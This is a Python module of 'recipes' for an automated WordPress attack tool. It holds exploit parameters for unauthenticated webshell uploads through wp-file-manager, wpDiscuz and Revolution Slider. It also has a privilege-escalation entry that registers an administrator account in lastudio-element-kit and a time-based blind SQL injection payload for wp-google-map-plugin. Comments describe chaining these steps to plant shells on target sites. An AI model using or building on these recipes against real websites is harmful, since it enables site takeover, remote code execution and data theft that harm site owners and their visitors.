"""Curated unauthenticated WordPress webshell-upload recipes."""

RECIPES = [
    {
        "plugin": "wp-file-manager",
        "cve": "CVE-2020-25213",
        "affected": "<=6.8",
        "method": "POST",
        "endpoint": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
        "params": {"cmd": "upload", "target": "l1_Lw"},
        "field": "upload[]",
        "upload_path": "/wp-content/plugins/wp-file-manager/lib/files/{filename}",
        "source": "registry",
        "note": "elFinder connector exposed unauthenticated; no extension check.",
    },
    {
        "plugin": "wpdiscuz",
        "cve": "CVE-2020-24186",
        "affected": ">=7.0.0,<=7.0.4",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "wmuUploadFiles", "wmu_nonce": ""},
        "field": "wmu_files[0]",
        "upload_path": "/wp-content/uploads/{filename}",
        "source": "registry",
        "note": "wmuUploadFiles trusts forged mime-type; drops PHP into uploads/.",
    },
    {
        "plugin": "revslider",
        "cve": "CVE-2014-9735",
        "affected": "<=3.0.95",
        "mode": "zip-extract",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "revslider_ajax_action", "client_action": "update_plugin"},
        "field": "update_file",
        "zip_inner_path": "revslider/{filename}",
        "upload_path": "/wp-content/plugins/revslider/temp/update_extract/revslider/{filename}",
        "source": "registry",
        # Verified against the Metasploit module wp_revslider_upload_execute:
        # update_plugin extracts the uploaded zip into temp/update_extract/, so a
        # zip carrying revslider/<shell>.php lands reachable there. UNAUTH only on
        # <=3.0.95 (the SoakSoak vector); modern revslider gates this behind admin.
        # The fingerprinter can't read revslider's version, so MATCH may fire this
        # on any revslider — VERIFY (confirmed exec) is what keeps it honest.
        "note": "revslider_ajax_action/update_plugin extracts an attacker zip; ship "
                "a PHP shell inside revslider/. Unauth in <=3.0.95.",
    },
]


def find_recipes(plugin_slug):
    return [r for r in RECIPES if r["plugin"] == plugin_slug]


# ── Track B: privilege-escalation recipes (unauth → admin account) ────────────
# These don't upload a shell directly; they grant an ADMIN account, which the
# authenticated-webshell stage (wp_authshell) then uses to plant a shell.
# Privilege-escalation recipes for Track B. wp_privesc.acquire_admin dispatches
# on "kind"; each kind reads a fixed set of fields — confirm every value against
# the CVE's PoC before running against a real target. Shapes:
#
#   register-role   : {endpoint, action, user_field, email_field, pass_field,
#                      role_param, role_value}  → creates an admin with our creds.
#   options-update  : {endpoint, option_name_param, option_value_param,
#                      set_options:{users_can_register:"1", default_role:"administrator"},
#                      register_endpoint, user_field, email_field, [pass_field]}
#                      → forces open registration + admin default role, registers.
#   auth-bypass     : {endpoint, method:"GET"|"POST", params}  → leaves the
#                      session authenticated as admin (returns {"authed": True}).
#   password-reset  : {endpoint, target_user, user_param, pass_param, params}
#                      → resets a known admin's password to one we choose.
PRIVESC_RECIPES = [
    {
        "plugin": "lastudio-element-kit",
        "cve": "CVE-2026-0920",
        "affected": "<=1.5.6.3",
        "kind": "register-role",
        "endpoint": "/wp-admin/admin-ajax.php",
        # ajax_register_handle is hooked to a nopriv AJAX action; the exact
        # action string should be confirmed against the plugin source / PoC.
        "action": "lastudio_register",
        "user_field": "user_login",
        "email_field": "email",
        "pass_field": "password",
        "role_param": "lakit_bkrole",
        "role_value": "administrator",
        "source": "registry",
        "note": "ajax_register_handle honours lakit_bkrole → unauth admin registration.",
    },
]


def find_privesc(plugin_slug):
    return [r for r in PRIVESC_RECIPES if r["plugin"] == plugin_slug]


# ── unauthenticated SQL-injection recipes (wp_sqli confirms/extracts) ──────────
# Success = proof that attacker SQL executed (a timing delta), NOT a shell. The
# payload is an ORDER BY-context injection: {cond} gates a SLEEP({sleep}).
SQLI_RECIPES = [
    {
        "plugin": "wp-google-map-plugin",
        "cve": "CVE-2026-2580",
        "affected": "<=4.9.1",
        "kind": "time-blind",
        "method": "GET",
        "endpoint": "/wp-admin/admin-ajax.php",
        # Sink CONFIRMED from source (core/class.tabular.php::prepare_items):
        #     $orderby = $_GET['orderby'] ?: $this->primary_col;
        #     $order   = $_GET['order']   ?: 'asc';
        #     $query  .= " order by {$orderby} {$order}";   // BOTH interpolated raw
        # So 'orderby' AND 'order' are injectable ORDER BY-context params (GET).
        # The vulnerable *frontend* trigger lives in the 4.9.x DataTables listing,
        # which isn't in the public wp.org mirror — the exact nopriv action must
        # come from the installed 4.9.x copy:
        #     grep -rn "wp_ajax_nopriv" wp-content/plugins/wp-google-map-plugin/
        # Replace the placeholder action below with what that prints.
        "params": {"action": "CONFIRM_nopriv_listing_action"},
        "inject_param": "orderby",       # 'order' is a second raw sink (fallback)
        "payload": "title,(SELECT CASE WHEN ({cond}) THEN SLEEP({sleep}) ELSE 0 END)",
        "true_cond": "1=1",
        "false_cond": "1=2",
        "source": "registry",
        "note": "Unauth time-based blind SQLi; ORDER BY sink confirmed in "
                "class.tabular.php (orderby+order, GET). Fill the real nopriv "
                "action from the installed 4.9.x copy.",
    },
]


def find_sqli(plugin_slug):
    return [r for r in SQLI_RECIPES if r["plugin"] == plugin_slug]
